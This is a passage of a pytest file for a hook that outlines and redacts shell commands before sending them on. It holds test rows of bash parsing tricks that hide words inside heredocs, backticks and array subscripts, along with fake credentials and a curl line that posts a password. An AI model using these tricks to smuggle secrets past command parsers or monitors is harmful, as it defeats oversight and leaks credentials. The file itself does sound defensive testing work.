    ("r1f18", "echo hi; 'ZQXSECRET", ("ZQXSECRET",)),
    ("r1f18", "ls && \"ZQXSECRET " + "b" * 70000 + "\"", ("ZQXSECRET",)),
    ("r1f18", "'ZQXSECRET " + "b" * 70000 + "'", ("ZQXSECRET",)),
    ("r1f19", "FOO=bar if {C}", ("{C}",)),
    ("r1f19", "x= if {C} echo", ("{C}",)),
    ("r1f19", "A=1 then {C}", ("{C}",)),
    ("r1f19", "A=1 do {C}", ("{C}",)),
    ("r1f19", "\"A=1\" {C}", ("{C}",)),
    ("r1f19", "\"if\" {C}", ("{C}",)),
    ("r1f19", "\\if {C}", ("{C}",)),
    ("r1f19", "> out.txt if {C}", ("{C}",)),
    ("r1f19", "2>/dev/null then {C}", ("{C}",)),
    ("r2f25", "cat > /tmp/note.txt <<EOF\nline one\\\nEOF\nhunter2pw --token abc\nEOF\n", ("hunter2pw", "--token")),
    ("r2f25", "cat > /tmp/note.txt <<$'EOF'\n$\nhunter2pw --token abc\nEOF\n", ("hunter2pw", "--token")),
    ("r2f25", "cat > /tmp/note.txt <<${X}\n$\nhunter2pw --token abc\n${X}\n", ("hunter2pw", "--token")),
    ("r2f25", "cat <<$(hunter2pw)\n$\nhunter2pw --token abc\n$(hunter2pw)\nend", ("hunter2pw", "--token")),
    ("r2f26", "true && \\\n[[ x < {C} ]]", ("{C}",)),
    ("r2f26", "true && \\\n[[ x > {C} ]]", ("{C}",)),
    ("r2f26", "true && \\\n[[ -n x && {C} == y ]]", ("{C}", "-n")),
    ("r2f26", "true && \\\n[[ -z x || {C} == y ]]", ("{C}", "-z")),
    ("r2f26", "true && \\\ncase x in a|{C}) true;; esac", ("{C}",)),
    ("r2f26", "function f { [[ x < {C} ]]; }", ("{C}",)),
    ("r2f26", "function f { case x in a|{C}) true;; esac; }", ("{C}",)),
    ("r2f26", "function f { [[ -n x && {C} == y ]]; }", ("{C}",)),
    ("r2f26", "time -p [[ x < {C} ]]", ("{C}",)),
    ("r2f26", "time -p case x in a|{C}) true;; esac", ("{C}",)),
    ("r2f26", "coproc c { [[ x < {C} ]]; }", ("{C}",)),
    ("r2f26", "coproc { case x in a|{C}) true;; esac; }", ("{C}",)),
    ("r2f26", "true && [\\\n[ x < {C} ]]", ("{C}",)),
    ("r3f37", "curl -d \"password=ab$$(hunter2 --token=abc -u admin)\" https://x.example",
     ("hunter2", "--token", "admin")),
    ("r3f37", "echo \"pid$$(hunter2 -u admin)\"", ("hunter2", "admin")),
    ("r3f37", "echo \"$$(secA secB)\"", ("secA", "secB")),
    ("r3f37", "cat \"$$(secA)\"", ("secA",)),
    ("r3f38", "cat <<EOF $(true\nEOF\n)\nhunter2\ncorrecthorsebatterystaple\nsudo s3cr3tpass\nx --api-key-abcdef\nEOF\n",
     ("hunter2", "correcthorsebatterystaple", "s3cr3tpass", "--api-key-abcdef", "sudo")),
    ("r3f38", "cat <<\\END $(cat <<END\nx\nEND\n) $(cat <<END\ny\nEND\n)\nhunter2\ncorrecthorsebatterystaple\nEND\n",
     ("hunter2", "correcthorsebatterystaple")),
    ("r3f38", "cat <<EOF `true\nEOF\n`\nhunter2\nEOF\n", ("hunter2",)),
    ("r3f38", "cat <<EOF <(true\nEOF\n)\nhunter2\nEOF\n", ("hunter2",)),
    ("r3f39", "echo [[\ncat > run.sh <<'EOF'\nresult=$(hunter2 --token=abc)\nEOF\n", ("hunter2", "--token")),
    ("r3f39", "type [[\n# deploy with $(hunter2 --api-key-abc123)\n", ("hunter2", "--api-key")),
    ("r3f39", "printf '%s' [[\ncat <<'EOF'\n$(secA)\nEOF\n", ("secA",)),
    ("r3f39", "echo [[ ; cat <<'EOF'\n$(secA)\nEOF\n", ("secA",)),
    ("r3f39", "grep -c [[ file\ncat <<'EOF'\n$(secA)\nEOF\n", ("secA",)),
    ("r3f42", "nohup A=1 {C}", ("{C}",)),
    ("r3f42", "exec A=1 {C}", ("{C}",)),
    ("r3f42", "command A=1 {C}", ("{C}",)),
    ("r3f42", "builtin A=1 {C}", ("{C}",)),
    ("r3f42", "xargs A=1 {C}", ("{C}",)),
    ("r3f42", "A=1 time k=v {C}", ("{C}",)),
    ("r3f42", "echo $(A=1 time k=v 'Cnry7Kq') 5", ("Cnry7Kq",)),
    ("r3f43", "echo $'x\\'\\'; {C} ' 'z'", ("{C}",)),
    ("r3f43", "A=(a # note )\n{C} x)", ("{C}",)),
    ("r3f43", "\"{C}\\x\"", ("{C}",)),
    ("r3f43", "echo hi # note; {C}", ("{C}",)),
    # Round 5, against bc5b316. The value is a redirect target here, which is a
    # path by syntax and which the known commands gate does not test, or a program
    # that is installed. Bash runs none of it: each is data in bash.
    # A backtick body is cut at the closing backtick first and has its backslashes
    # undone, and only then read as commands. A comment that ends in a backslash
    # goes on to the next line, a backtick can sit inside what looks like a comment,
    # and \\ is \ before an ANSI-C string is read.
    ("r5f1", "echo `# rotate \\\n>{C}`", ("{C}",)),
    ("r5f1", "echo `# ` `<<EOF\n >{C} `", ("{C}",)),
    ("r5f1", "echo `echo $'a\\\\' ; >{C} ; echo $'b\\\\'`", ("{C}",)),
    ("r5f1", "echo `echo $'a\\\\' ; {C} --secret-flag ; echo $'b\\\\'`", ("{C}", "--secret-flag")),
    ("r5f1", "echo `echo $'a\\\\' ; whoami --secret-flag ; echo $'b\\\\'`", ("whoami", "--secret-flag")),
    ("r5f1", "echo `[[ x # ` `<<EOF\n]] >{C} `", ("{C}",)),
    # The same rule for a here-document body: a line that ends in a backslash is
    # joined or not by what the backtick body looks like after bash undoes it.
    ("r5f1", "echo `cat <<EOF\nfoo\\\\\nEOF\n>{C}\nEOF\n`", ("{C}",)),
    ("r5f1", "echo `cat <<'EOF'\nfoo\\\nEOF\n>{C}\nEOF\n`", ("{C}",)),
    # Where bash expects a command it reads NAME[ as an array assignment and takes
    # everything up to the matching ] into one word, spaces and operators included.
    ("r5f2", "declare -A m; m[k >{C} ]=1", ("{C}",)),
    ("r5f2", "declare -A m; m[k; echo --secret-flag ]=1", ("--secret-flag",)),
    ("r5f2", "declare -A m; m[k; {C} --secret-flag ]=1", ("{C}", "--secret-flag")),
    ("r5f2", "declare -A m; m[k; whoami ]=1", ("whoami",)),
    ("r5f2", "echo \"a $(true[[ \n>{C}\n]] ) b\"", ("{C}",)),
    ("r5f2", "declare -A m; m['a]' >{C} ]=1", ("{C}",)),
    ("r5f2", "declare -A m; m[a[b >{C} ]c]=1", ("{C}",)),
    ("r5f2", "declare -A m; m[k\n>{C}\n]=1", ("{C}",)),
    ("r5f2", "declare -A m; m[a\\ >{C} ]=1", ("{C}",)),
    ("r5f2", "declare -A m; time m[k >{C} ]=1", ("{C}",)),
    ("r5f2", "declare -A m; time -p m[k >{C} ]=1", ("{C}",)),
    ("r5f2", "declare -A m; >g m[k >{C} ]=1", ("{C}",)),
    ("r5f2", "declare -A m; X=1 m[k >{C} ]=1", ("{C}",)),
    ("r5f2", "declare -A m; if true; then m[k >{C} ]=1; fi", ("{C}",)),
    ("r5f2", "declare -A m; (m[k >{C} ]=1)", ("{C}",)),
    ("r5f2", "declare -A m; echo $(m[k >{C} ]=1)", ("{C}",)),
    # A delimiter is the text up to the next blank, and bash takes <( and >( into
    # the word whole. Nothing in it is run.
    ("r5f3", "cat <<EOF<(>{C})\nbody\nEOF\n", ("{C}",)),
    ("r5f3", "cat << >(>{C}\n)", ("{C}",)),
    ("r5f3", "cat <<EOF<({C} --secret-flag)\nbody\nEOF\n", ("{C}", "--secret-flag")),
    ("r5f3", "cat <<EOF<(whoami)\nbody\nEOF\n", ("whoami",)),
    ("r5f3", "cat <<-EOF<(>{C})\nbody\nEOF\n", ("{C}",)),
    ("r5f3", "cat <<'EOF'<(>{C})\nbody\nEOF\n", ("{C}",)),
    ("r5f3", "cat <<\"EOF\"<(>{C})\nbody\nEOF\n", ("{C}",)),
    ("r5f3", "cat <<EOF>(>{C})\nbody\nEOF\n", ("{C}",)),
    # Round 6, against ab83181. Again the value is a redirect target or a program
    # that is installed, and bash runs none of it. A $ then a line continuation then
    # ( or { inside double quotes is an expansion once bash removes the pair, so the
    # inner quote does not end the string and the text inside is a nested string.
    ("r6f1", "echo \"$\\\n(echo \"x >{C} \")\"", ("{C}",)),
    ("r6f1", "echo \"$\\\n{x:-\"a >{C} \"}\"", ("{C}",)),
    ("r6f1", "echo \"$\\\n$(echo hi >{C})\"", ("{C}",)),
    # The head of an array assignment is NAME[ with the continuations taken out.
    ("r6f2", "a\\\n[k >{C} ]=1", ("{C}",)),
    ("r6f2", "time a\\\n[k >{C} ]=1", ("{C}",)),
    ("r6f2", "x=1 a\\\n[k >{C} ]=1", ("{C}",)),
    ("r6f2", "ab\\\nc[k >{C} ]=1", ("{C}",)),
    ("r6f2", "a\\\n\\\n[k >{C} ]=1", ("{C}",)),
    # A [[ closes at the first ]] that is a word by itself. The reader closed on fewer
    # forms than bash does and went on to a later ]] in a here-document body.
    ("r6f3", "[[ -f a \\\n]]\ncat <<'E'\nx ]] >{C}\nE", ("{C}",)),
    ("r6f3", "[[ a ]\\\n] && cat <<'E'\nx ]] >{C}\nE", ("{C}",)),
    ("r6f3", "[[ ( -f a )]]\ncat <<'E'\nx ]] >{C}\nE", ("{C}",)),
    ("r6f3", "[[ -f a ]]>/dev/null\ncat <<'E'\nx ]] >{C}\nE", ("{C}",)),
    ("r6f3", "[[ -f a ]]</dev/null\ncat <<'E'\nx ]] >{C}\nE", ("{C}",)),
    ("r6f3", "[[ -n x \\\n# $(a >{C} b)\n]]", ("{C}",)),
    ("r6f3", "[[ -f a \\\n]]\ncat <<'E'\nnote ]]\necho --api-key-AbCdEf1234\ncurl -u admin:hunter2 --header-secret\n"
             "ls /tmp/AbCdEf1234 > /tmp/AbCdEf1234.out\nE", ("--api-key", "--header-secret", "AbCdEf1234", "hunter2")),
    # Inside $( ), <( ) and backticks bash ends the substitution at a here-document
    # line that begins with the delimiter and goes on, and at a closing backtick.
    ("r6f4", "x=$(cat <<E\nbody\nE )\ncat <<'F'\nE\ny >{C}\n)\nF", ("{C}",)),
    ("r6f4", "x=$(cat <<E\nbody\nE)\ncat <<'F'\nE\ny >{C}\n)\nF", ("{C}",)),
    ("r6f4", "x=$(cat <<E\nbody\nE) # c\ncat <<'F'\nE\ny >{C}\n)\nF", ("{C}",)),
    ("r6f4", "x=$(cat <<E\nbody\nE)x\ncat <<'F'\nE\ny >{C}\n)\nF", ("{C}",)),
    ("r6f4", "x=$(cat <<'E'\nbody\nE)\ncat <<'F'\nE\ny >{C}\n)\nF", ("{C}",)),
    ("r6f4", "x=$(cat <<-E\nbody\nE)\ncat <<'F'\nE\ny >{C}\n)\nF", ("{C}",)),
    ("r6f4", "echo <(cat <<-E\n/tmp/x\nE)\ncat <<'F'\nE\ny >{C}\n)\nF", ("{C}",)),
    ("r6f4", "x=`cat <<E\nbody\nE`\ncat <<'F'\nE\ny >{C}\n`\nF", ("{C}",)),
    ("r6f4", "echo \"$(cat <<'EOF'\nsubject\nEOF)\"\ncat <<'F'\nEOF\ny >{C}\n)\nF", ("{C}",)),
    # Runtime parse state: after shopt -s expand_aliases an alias can expand to the
    # start of a here-document, and the lines after it are data to bash.
    ("r6f5", "shopt -s expand_aliases\nalias foo='cat <<EOF'\nfoo\na >{C}\nEOF", ("{C}",)),
    ("r6f5", "shopt -s expand_aliases; alias foo='cat <<EOF'\nfoo\na >{C}\nEOF", ("{C}",)),
]


def secret_words():
    """The words the prior findings hide, as names a program could have. A flag is
    not one, and neither is anything outside what a program name may be."""
    words = {w.replace("{C}", CANARIES[0]) for _, _, forbidden in PRIOR_FINDINGS for w in forbidden}
    words |= {"hunter2", "hunter2pw", "correcthorsebattery", "s3cr3tvalue", "secA", "secB", "S3cret"}
    return {w for w in words if jev.PROGRAM.fullmatch(w) and not w.startswith("-")}


@pytest.mark.parametrize("finding,command,forbidden", PRIOR_FINDINGS,
                         ids=["%s-%d" % (row[0], n) for n, row in enumerate(PRIOR_FINDINGS)])
def test_no_reproduction_from_the_verify_rounds_sends_a_value(stub, secrets, finding, command, forbidden):
    """Each of these sent its words at the commit its round ran against. On an
    ordinary machine the gate drops them, and on one where the words are the names
    of commands the reader alone has to, which is the case that matters."""
    command = command.replace("{C}", CANARIES[0])
    forbidden = [w.replace("{C}", CANARIES[0]) for w in forbidden]
    text = outline(command)
    assert [w for w in forbidden if w in text] == [], text
    go(stub, payload(command=command))
    assert [w for w in forbidden if w in sent_text(stub)] == []
    everything = sent_everything(stub)
    assert [w for w in forbidden if len(w) > 6 and not w.startswith("-") and w in everything] == []


def test_the_installed_programs_cover_every_program_the_reader_tests_name(installed_bin, secret_bin, monkeypatch):
    """Without this a row that names a program that is not installed would pass
    because the gate dropped the program, and the reader behind it would go
    untested. With the gate open the outline of every row is the same."""
    path_of(installed_bin, secret_bin, monkeypatch=monkeypatch)
    commands = [t.format(s=c) for t in VALUE_PLACES for c in CANARIES]
    commands += [WRAPPERS[w](t.format(s=CANARIES[0])) for w in sorted(WRAPPERS) for t in VALUE_PLACES
                 if fits_wrapper(w, t)]
    commands += [c.replace("{bin}", str(installed_bin)) for c, _ in OUTLINE_ROWS]
    commands += [c for c, _ in STOP_ROWS]
    commands += [c.replace("{C}", CANARIES[0]) for _, c, _ in PRIOR_FINDINGS if len(c) < 1000]
    shut = [outline(c) for c in commands]
    with monkeypatch.context() as m:
        m.setattr(jev.Shell, "known", lambda self, word: True)
        opened = [outline(c) for c in commands]
    differ = [(c, a, b) for c, a, b in zip(commands, shut, opened, strict=True) if a != b]
    assert differ == [], differ[:3]
    assert len(commands) > 4000


def test_an_assignment_needs_its_name_and_its_equals_sign_typed_bare():
    for word, quoted_at in (("A=1", None), ("A=b c", 2), ("A+=1", None), ("A[0]=x", None), ("A=", 2)):
        assert jev.assignment(word, quoted_at), (word, quoted_at)
    for word, quoted_at in (("A=1", 0), ("A=1", 1), ("A+=1", 2), ("a b", None), ("A", None), ("=1", None)):
        assert not jev.assignment(word, quoted_at), (word, quoted_at)


def test_a_backslash_inside_backticks_ends_the_read():
    assert "git" not in outline("echo `echo \\`x\\``; git push --force")
    assert "git" not in outline("echo `echo \"a\\\"b\"`; git push --force")


def shell_of(text):
    return jev.Shell(text, jev.Outline(jev.MAX_OUT), "/nonexistent-cwd", "/home/nobody")


def test_a_subscript_is_read_only_when_it_closes_before_anything_that_splits_the_word():
    """Where bash expects a command, NAME[ takes everything up to the matching ] into
    one word. This reader ends a word at a blank or an operator, so it has to see the
    ] before one, and before anything it reads as a piece of a word and bash reads as
    a pair inside the subscript."""
    for text in ("m[1]=x", "m[$i]=x", "m[i+1]=x", "m[a[b]c]=x", "m[1]", "m[]=x", "a[1]b[2]=c", "_a1[0]+=x",
                 "ls", "[ -f x ]", "x=1", "echo", "m", "9[ >f ]"):
        assert shell_of(text).subscript_closes(0), text
    for text in ("m[k >f ]=1", "m[k", "a[", "m[k;x]=1", "m[k|x]=1", "m[k&x]=1", "m[a b]=1", "m[a\tb]=1", "m[k\n]=1",
                 "m[a<b]=1", "m[a>b]=1", "m[a(b)]=1", "m['a']=1", 'm["a"]=1', "m[a\\]]=1", "m[$(x)]=1",
                 "m[${i}]=1", "m[`x`]=1", "m[$1]=1", "m[$]=1", "m[$((1))]=1", "m[a[b ]c]=1", "m[a[b]=1"):
        assert not shell_of(text).subscript_closes(0), text
    assert shell_of("ls m[k >f ]=1").subscript_closes(3) is False
    assert shell_of("ls m[k >f ]=1").subscript_closes(0) is True


def test_a_comment_inside_backticks_ends_the_read_and_one_outside_does_not():
    assert outline("ls; echo `echo hi # note`; git push --force") == "ls\necho"
    assert outline("ls; echo `echo hi`; echo hi # note `x`\ngit push --force") == "ls\necho\necho\necho\ngit --force"
    assert outline("ls; echo $(echo hi # note\n); git push --force") == "ls\necho\necho\ngit --force"
    assert outline("ls; echo `echo $(echo hi # note\n)`; git push --force") == "ls\necho"


def test_an_ansi_c_string_with_a_backslash_inside_backticks_ends_the_read_and_one_without_does_not():
    assert outline("ls; echo `echo $'a\\\\'`; git push --force") == "ls\necho"
    assert outline("ls; echo `echo $'a\\n'`; git push --force") == "ls\necho"
    assert outline("ls; echo `echo $'abc'`; git push --force") == "ls\necho\necho\ngit --force"
    assert outline("ls; echo $(echo $'a\\\\'); git push --force") == "ls\necho\necho\ngit --force"


def test_a_here_document_line_that_ends_in_a_backslash_inside_backticks_ends_the_read():
    for delimiter in ("EOF", "'EOF'", '"EOF"'):
        for tail in ("\\", "\\\\", "\\\\\\"):
            command = "ls; echo `cat <<%s\nx%s\nEOF\n`; git push --force" % (delimiter, tail)
            assert outline(command) == "ls\necho", command
    assert outline("ls; echo `cat <<EOF\nx\nEOF\n`; git push --force") == "ls\necho\ncat\ngit --force"
    assert outline("ls; cat <<EOF\nx\\\\\nEOF\ngit push --force") == "ls\ncat\ngit --force"


def test_a_here_document_delimiter_that_runs_into_a_process_substitution_ends_the_read():
    for opener in ("<(", ">("):
        for delimiter in ("EOF", "'EOF'", '"EOF"', "E\"O\"F", "''"):
            for glue in ("<<", "<<-"):
                command = "ls; cat %s%s%ssort)\nx\nEOF\ngit push --force" % (glue, delimiter, opener)
                assert outline(command) == "ls\ncat", command
        assert outline("ls; cat << %ssort\n)\ngit push --force" % opener) == "ls\ncat"
    # A process substitution that follows a blank, and every other redirect operand,
    # is read, because bash expands it there.
    assert outline("ls; cat <<EOF <(sort)\nx\nEOF\ngit push --force") == "ls\ncat\nsort\ngit --force"
    assert outline("ls; cat <<<a<(sort); git push --force") == "ls\ncat\nsort\ngit --force"
    assert outline("ls; cat >a<(sort); git push --force") == "ls\ncat a\nsort\ngit --force"


# cat is a stub because the real one opens /dev/fd/63 for reading when a row hands it
# a >( ) and waits on the pipe for ever. Nothing a row asks of cat is to read.
BASH_GROUND_PREAMBLE = (
    'command_not_found_handle() { printf "%s\\n" "$1" >> "$LOG"; return 0; }\n'
    'whoami() { printf "whoami\\n" >> "$LOG"; }\n'
    'cat() { return 0; }\n'
)


def what_bash_does(tmp_path, command):
    """The files the command creates and the command names it asks for, in real bash
    in an empty directory. Skipped unless bash is the version the pinned list came
    from: the rules these rows pin are old, but a runner's bash is not this one."""
    bash = pinned_bash()
    work = tmp_path / "cwd"
    work.mkdir()
    log = tmp_path / "ran.log"
    log.write_text("")
    env = {"PATH": ORIGINAL_PATH, "HOME": str(work), "LOG": str(log), "LC_ALL": "C"}
    subprocess.run([bash, "-c", BASH_GROUND_PREAMBLE + command], cwd=work, env=env, stdin=subprocess.DEVNULL,
                   capture_output=True, timeout=30)
    return sorted(p.name for p in work.iterdir()), log.read_text().split("\n")


ROUND_5 = [row for row in PRIOR_FINDINGS if row[0].startswith("r5")]


@pytest.mark.parametrize("finding,command,forbidden", ROUND_5, ids=["%s-%d" % (row[0], n) for n, row in enumerate(ROUND_5)])
def test_bash_runs_nothing_of_what_the_round_5_reproductions_hide(tmp_path, finding, command, forbidden):
    """The rows are only findings if bash treats the hidden text as data. Run each in
    bash itself: no file is created under a forbidden name and no command is looked
    up by one."""
    command = command.replace("{C}", CANARIES[0])
    forbidden = [w.replace("{C}", CANARIES[0]) for w in forbidden]
    files, ran = what_bash_does(tmp_path, command)
    assert [w for w in forbidden if w in files or w in ran] == []


ROUND_5_CONTROLS = [
    # Next to each stop, the same text where bash does run the redirect. The reader
    # reads these and sends the path: stopping at them would only cost fidelity, but
    # the rows pin that the stops are no wider than the findings.
    ("cat <<EOF >(>{C})\nbody\nEOF", "cat\n{C}"),
    ("cat <<EOF><(>{C})\nbody\nEOF\n", "cat\n{C}"),
    ("declare m[k >{C} ]=1", "declare {C}"),
    ("export m[k >{C} ]=1", "export {C}"),
    ("m[1]=x >{C}; ls", "{C}\nls"),
    ("m[$k]=x >{C}; ls", "{C}\nls"),
    ("cat <<EOF >{C}\nbody\nEOF\nls", "cat {C}\nls"),
]


@pytest.mark.parametrize("command,expected", ROUND_5_CONTROLS)
def test_the_syntax_next_to_the_round_5_stops_that_does_run_a_redirect_is_still_read(tmp_path, command, expected):
    command, expected = command.replace("{C}", CANARIES[0]), expected.replace("{C}", CANARIES[0])
    assert outline(command) == expected
    files, _ = what_bash_does(tmp_path, command)
    assert files == [CANARIES[0]]


ROUND_6 = [row for row in PRIOR_FINDINGS if row[0].startswith("r6")]


@pytest.mark.parametrize("finding,command,forbidden", ROUND_6, ids=["%s-%d" % (row[0], n) for n, row in enumerate(ROUND_6)])
def test_bash_parses_and_runs_nothing_of_what_the_round_6_reproductions_hide(tmp_path, finding, command, forbidden):
    """As for round 5, and a row is also a command bash accepts, so that the text it
    hides is data in a script that parses and not in one that is a syntax error."""
    command = command.replace("{C}", CANARIES[0])
    forbidden = [w.replace("{C}", CANARIES[0]) for w in forbidden]
    assert bash_parse(pinned_bash(), command, tmp_path) is not None, command
    files, ran = what_bash_does(tmp_path, command)
    assert [w for w in forbidden if w in files or w in ran] == []


ROUND_6_CONTROLS = [
    # Next to each stop of round 6, the same text where bash does run the redirect. The
    # reader reads these and sends the path, so the stops are no wider than the findings.
    ("[[ -n x ]]>{C}", "{C}"),
    ("[[ -n x \\\n]] >{C}", "{C}"),
    ("[[ -n x ]\\\n] >{C}", "{C}"),
    ("[[ -n x ]]\\\n>{C}", "{C}"),
    ("[[ ( -n x ) ]] >{C}", "{C}"),
    ("m\\\n[1]=x >{C}; ls", "{C}\nls"),
    ("a\\\nb[1]=x >{C}; ls", "{C}\nls"),
    ("(cat <<E\nbody\nE)\nE\n); echo hi >{C}", "cat\necho {C}"),
    ("cat <<E\nbody\nE)\nE\n>{C}", "cat\n{C}"),
    ("echo $(cat <<E\nbody\nE\n) >{C}", "echo\ncat\n{C}"),
    ("echo `cat <<E\nbody\nE\n` >{C}", "echo\ncat\n{C}"),
    ("shopt -s nullglob; echo hi >{C}", "shopt -s\necho {C}"),
    ("echo \"\\$\\\n(x y)\" >{C}", "echo {C}"),
    ("echo \"$$\" >{C}", "echo {C}"),
]


@pytest.mark.parametrize("command,expected", ROUND_6_CONTROLS)
def test_the_syntax_next_to_the_round_6_stops_that_does_run_a_redirect_is_still_read(tmp_path, command, expected):
    command, expected = command.replace("{C}", CANARIES[0]), expected.replace("{C}", CANARIES[0])
    assert outline(command) == expected
    assert bash_parse(pinned_bash(), command, tmp_path) is not None, command
    files, _ = what_bash_does(tmp_path, command)
    assert files == [CANARIES[0]]


def test_the_docs_name_each_stop_of_round_6():
    flat = " ".join((ROOT / "CLAUDE.md").read_text().split("## The Jev router")[1].split("\n## ")[0].split())
    for stated in ("A `$` followed by one inside double quotes ends the read",
                   "found with the continuations taken out",
                   "The `]]` is the first one that is a word by itself",
                   "A `]]` glued to a parenthesis ends the read",
                   "A body line inside a substitution that begins with the delimiter and is not it",
                   "any body line with a backtick in it inside backticks",
                   "the read ends at the word `alias` wherever it is typed",
                   "at a word that names `expand_aliases` or `BASH_ALIASES`, and at an expansion handed to `shopt`",
                   "an alias that the shell's profile or a file the command sources defines",
                   "Round 6, against `ab83181`"):
        assert stated in flat, stated


def test_the_docs_name_each_stop_of_round_5_and_no_longer_claim_the_gate_covers_a_redirect_target():
    flat = " ".join((ROOT / "CLAUDE.md").read_text().split("## The Jev router")[1].split("\n## ")[0].split())
    for stated in ("a here-document delimiter that runs into `<(` or `>(`",
                   "inside backticks a comment, a backslash in an ANSI-C string and a here-document line that ends "
                   "in a backslash",
                   "`NAME[` at the start of a command", "until round 5"):
        assert stated in flat, stated
    assert "Every reader mistake now costs a word" not in flat
    assert "Every reader mistake then costs a word" not in " ".join(HOOK.read_text().split())


def test_substitutions_nested_past_the_cap_end_the_read_and_never_crash():
    deep = "echo " + "$(echo " * 40 + ")" * 40 + "; git push --force"
    lines = outline(deep).split("\n")
    assert len(lines) <= jev.MAX_NEST + 2 and "git" not in lines
    assert outline("echo " + "$(echo " * (jev.MAX_NEST - 1) + ")" * (jev.MAX_NEST - 1) + "; ls").endswith("ls")


def test_a_program_name_comes_from_a_whole_word_that_is_a_plain_piece():
    assert jev.program_name("git") == "git"
    assert jev.program_name("/usr/bin/env") == "env"
    assert jev.program_name("./run.sh") == "run.sh"
    for word in ("curl https://h/api/Zq81nTwUvaBcDe", "A B=x/Zq81nTwUvaBcDe", "A[0]=x/Zq81nTwUvaBcDe",
                 "x:y/Zq81nTwUvaBcDe", "a=b/c", "a/b c", "$/x", "", "/", "a/" + "b" * 41):
        assert jev.program_name(word) is None, word


def test_an_assignment_may_carry_a_subscript_and_is_still_an_assignment():
    for word in ("A=1", "A+=1", "A=", "A[0]=x", "A[i]+=x", "arr[1]=http://h/x", "A[$i]=x/y", "_a1=b"):
        assert jev.is_assignment(word), word
    for word in ("A", "A[0]", "A[0", "[0]=x", "A[0]x=1", "a-b=c", "=x", "1a=b", "A.b=c"):
        assert not jev.is_assignment(word), word


def test_a_long_run_of_digits_is_not_a_program_or_a_flag_name():
    assert outline("ls 0123456789abcdef0123456789abcdef --0123456789abcdef -x") == "ls -x"
    assert outline("ls ghp_aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5 --flag") == "ls --flag"
    assert outline("ls --sha256 --x509") == "ls --sha256 --x509"
    for program in ("0123456789abcdef0123456789abcdef", "ghp_aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5"):
        assert outline("%s --flag -x" % program) == "", "not a program, so the flags of its command go too"


def test_a_flag_value_attached_to_a_short_flag_is_dropped_beyond_two_letters():
    assert outline("mysql -phunter2") == "mysql"
    assert outline("mysql -pS3cret") == "mysql"
    assert outline("mysql -uadmin") == "mysql"
    assert outline("curl -fsSL x") == "curl"
    assert outline("curl -sS x") == "curl -sS"


def test_a_bare_word_is_a_path_only_when_it_exists(tmp_path):
    (tmp_path / "notes.txt").write_text("x")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "a.py").write_text("x")
    cwd = str(tmp_path)
    assert outline("cat notes.txt missing.txt", cwd=cwd) == "cat notes.txt"
    assert outline("cat sub/a.py ./sub/a.py sub/b.py", cwd=cwd) == "cat sub/a.py ./sub/a.py"
    assert outline("cat %s" % (tmp_path / "notes.txt"), cwd="/nonexistent") == "cat %s" % (tmp_path / "notes.txt")
    assert outline("cat 'notes.txt'", cwd=cwd) == "cat notes.txt"
    assert outline("cat 'no tes.txt'", cwd=cwd) == "cat"


def test_a_secret_that_fits_the_path_class_is_not_sent_as_a_path():
    for secret in ("wJalrXUtnFEMI/K7MDENG/bPxRfiCYzz9Q7Z8XQK", "ghp_aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5",
                   "/Zq81nT0wUv44aB/xyz", "~/Zq81nT0wUv44aB", "./Zq81nT0wUv44aB", "0123456789abcdef0123456789abcdef"):
        assert outline("echo %s" % secret) == "echo", secret
        assert outline("aws configure set k %s" % secret) == "aws", secret


def test_only_a_few_bare_words_are_looked_up_on_disk(tmp_path, monkeypatch):
    looked = []
    real = os.path.lexists
    monkeypatch.setattr(os.path, "lexists", lambda p: looked.append(p) or real(p))
    outline("cat " + "w%d " % 0 * 5000, cwd=str(tmp_path))
    assert len(looked) == jev.MAX_STATS


def test_a_path_under_home_is_written_with_a_tilde(home):
    (home / "notes.txt").write_text("x")
    h = str(home)
    assert outline("cat %s/notes.txt" % h, home=h, cwd="/nonexistent") == "cat ~/notes.txt"
    assert outline("cat ~/notes.txt", home=h, cwd="/nonexistent") == "cat ~/notes.txt"
    assert outline("cat ~/missing.txt", home=h, cwd="/nonexistent") == "cat"
    assert outline("echo > %s/new.txt" % h, home=h) == "echo ~/new.txt"
    assert outline("cat %sother/x" % h, home=h) == "cat"
    assert outline("cat ~/x", home="") == "cat"


def test_the_home_directory_never_leaves_in_a_path(stub, home):
    h = str(home)
    go(stub, payload(tool="Write", tool_input={"file_path": h + "/notes/plan.md", "content": "x"}))
    assert sent_text(stub) == "path ~/notes/plan.md\nfields file_path content"
    assert h not in sent_everything(stub)
    go(stub, payload(command="echo hi > %s/out.txt" % h))
    assert sent_text(stub) == "echo ~/out.txt"
    assert h not in sent_everything(stub)
    go(stub, payload(tool="NotebookEdit", tool_input={"notebook_path": h, "new_source": "x"}))
    assert sent_text(stub).startswith("path ~\n")


def test_a_home_of_slash_replaces_nothing(stub, monkeypatch):
    monkeypatch.setenv("HOME", "/")
    go(stub, payload(tool="Write", tool_input={"file_path": "/etc/x.conf", "content": "x"}))
    assert sent_text(stub).startswith("path /etc/x.conf\n")


def test_a_redirect_target_over_200_characters_is_dropped():
    long = "/" + "a" * 199
    assert outline("echo > %s" % long) == "echo %s" % long
    assert outline("echo > %s" % (long + "a")) == "echo"


@pytest.mark.parametrize("tool,field", [("Write", "file_path"), ("Edit", "file_path"), ("NotebookEdit", "notebook_path")])
def test_a_file_path_over_200_characters_is_dropped(stub, tool, field):
    ok = "/" + "a" * 199
    go(stub, payload(tool=tool, tool_input={field: ok, "content": "x"}))
    assert sent_text(stub).startswith("path " + ok + "\n")
    go(stub, payload(tool=tool, tool_input={field: ok + "a", "content": "x"}))
    assert sent_text(stub) == "fields %s content" % field
    assert "aaaa" not in sent_everything(stub)


@pytest.mark.parametrize("bad", ["/repo/my file.txt", "/repo/a;b", "/repo/é.txt", "/repo/a b/../c", "$HOME/x",
                                 "/repo/a\nb", "/repo/$(x)", "", None, 7, ["/repo/x"], "/repo/a=b"])
def test_a_file_path_outside_the_character_class_is_dropped_not_escaped(stub, bad):
    go(stub, payload(tool="Write", tool_input={"file_path": bad, "content": "x"}))
    text = sent_text(stub)
    assert not text.startswith("path"), text
    assert text == "fields file_path content"
    assert "/repo/" not in sent_everything(stub)


FILE_BODY_SECRETS = {
    "ghp": "ghp_" + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5",
